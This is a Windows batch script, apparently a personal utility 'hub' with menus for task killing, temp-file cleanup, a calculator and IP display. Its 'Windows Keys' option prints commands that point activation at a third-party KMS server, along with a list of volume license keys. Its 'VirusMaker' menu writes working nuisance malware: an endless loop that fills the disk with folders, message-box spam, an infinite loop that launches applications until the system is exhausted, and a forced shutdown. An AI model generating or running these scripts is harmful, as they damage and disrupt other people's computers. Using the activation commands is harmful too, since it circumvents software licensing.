echo off
cls
color 5
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Success: Administrative permissions confirmed.
    goto begin
) else (
    echo Failure: Current permissions inadequate.
    echo.
    pause
)
:begin
echo off
cls
color 5
echo =============================================================================
echo.
echo                    Welcome, this hub was created by Kaue
echo.
echo =============================================================================
echo.
echo.
echo [1] killtasks (only useless)
echo [2] Deep clean (temp files)
echo [3] Apps
echo [4] Windows Keys 
echo [5] Verify your windows license
echo.
echo [0] Exit

set /p option=Your option is: 

if "%option%" == "1" goto op1
if "%option%" == "2" goto op2 
if "%option%" == "3" goto hub3
if "%option%" == "4" goto op4
if "%option%" == "5" goto op5

if "%option%" == "0" goto op0


:op1
taskkill /f /im pservice.exe
taskkill /f /im parsecd.exe
taskkill /f /im wallpaperservice32_c
goto begin

:op2 
if exist c:\windows\temp\ del /f /s /q c:\windows\temp\ 
del /f /s /q %temp%\
del /f /s /q c:\windows\prefetch\
"C:\WINDOWS\system32\dfrgui" > nul
goto begin 

:hub3
echo off
cls
color 1
echo =============================================================================
echo.
echo                                   Apps
echo.
echo =============================================================================
echo.
echo.
echo [1] Calc (byKaue)
echo [2] Calc (byWindows)
echo [3] Show IPv4 or IPv6
echo [4] VirusMaker(byKaue)
echo.
echo [0] Back to begin

set /p option=Your option is: 

if "%option%" == "1" goto op6
if "%option%" == "2" goto op7 
if "%option%" == "3" goto hub8
if "%option%" == "4" goto hub9

if "%option%" == "0" goto begin

::seguindo as "ops" do inicio
:op4
echo off
cls
color 1
echo cscript slmgr.vbs /ipk "Put your windows serial here without apostrophes"
echo.
echo cscript slmgr.vbs /skms kms.lotro.cc
echo.
echo cscript slmgr.vbs /ato
echo.
echo.
echo Seriais Todas as versoes.
echo Home/Core                      TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
echo Home/Core (Country Specific)   PVMJN-6DFY6-9CCP6-7BKTT-D3WVR
echo Home/Core (Single Language)    7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
echo Home/Core N                    3KHY7-WNT83-DGQKR-F7HPR-844BM
echo Professional                   W269N-WFGWX-YVC9B-4J6C9-T83GX
echo Professional N                 MH37W-N47XK-V7XM9-C7227-GCQG9
echo Enterprise                     NPPR9-FWDCX-D2C8J-H872K-2YT43
echo Enterprise N                   DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
echo Education                      NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
echo Education N                    2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
echo.
pause
goto begin

:op5
slmgr.vbs /dli > nul
goto begin

:op6
echo off
cls
color 1
echo {obs: operators,   +  -  *  /}
echo.
set /p MATH=Your equation here: 
set /a RESULT=%MATH%

echo %RESULT%
echo.
echo [1] yes
echo [2] no
echo.----------------- 
set /p cont=Again?: 

if "%cont%" == "1" goto op6
if "%cont%" == "2" goto hub3

:op7
start Calc > nul
goto hub3

::funcs IP
:hub8
echo off
cls
color 4
echo =============================================================================
echo.
echo                                  Show IPs
echo.
echo =============================================================================
echo.
echo [1] IPv4 
echo [2] IPv6
echo.
echo [0] Back to hub 

set /p option=Your option is: 

if "%option%" == "1" goto ip1
if "%option%" == "2" goto ip2 

if "%option%" == "0" goto hub3

:ip1
echo off
cls
echo.
color 4
ipconfig | findstr IPv4
echo.
pause
goto hub8

:ip2
echo off
cls
echo.
color 4
ipconfig | findstr IPv6
echo.
pause
goto hub8

::end func IP

::hub virusmaker
:hub9
echo off
cls
color 4
echo =============================================================================
echo.
echo                                 Virus Maker
echo.
echo =============================================================================
echo. 
echo [1] infinite past
echo [2] msgbox 
echo [3] infinite apps
echo [4] shutdown alert
echo.
echo [0] back to hub

set /p option=Your option is: 

if "%option%" == "1" goto virus1
if "%option%" == "2" goto virus2
if "%option%" == "3" goto virus3
if "%option%" == "4" goto virus4

if "%option%" == "0" goto hub3

:virus1
echo off
cls
color 2
echo/:loop > index.bat
echo/cd C:\ >> index.bat
echo/md "%%random%% {%%random%%} %%random%%" >> index.bat
echo/cd %userprofile% >> index.bat
echo/md "([%%random%% {%%random%%} %%random%%])" >> index.bat
echo/goto loop >> index.bat
goto hub9

:virus2
echo off
cls
color 2
echo/msgbox "MDS, TU E BURRO?❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌",16, "TA FUDIDO" > ILM.vbs
echo/For /l %%%%r in ^(1,1,50^) do ^(Start ILM.vbs^) > virus.bat
echo/Exit >> virus.bat
echo/caso queira editar o número de msgbox, é só alterar dentro do código na linha 2 o número "50" pra um do seu agrado > notes.txt 
goto hub9

:virus3
echo off
cls
color 2
echo/:loop > infinite.bat
echo/start cmd >> infinite.bat
echo/start calc >> infinite.bat
echo/start notepad >> infinite.bat
echo/goto loop >> infinite.bat
goto hub9

:virus4
echo off
cls 
color 2
echo/shutdown -s -c YouFUCKEDtheWrongOne -t 10 > shutdown.cmd
echo/shutdown -a = cancel any commands {if u need, use admin privileges} > notes.txt
goto hub9
::virus end

:op0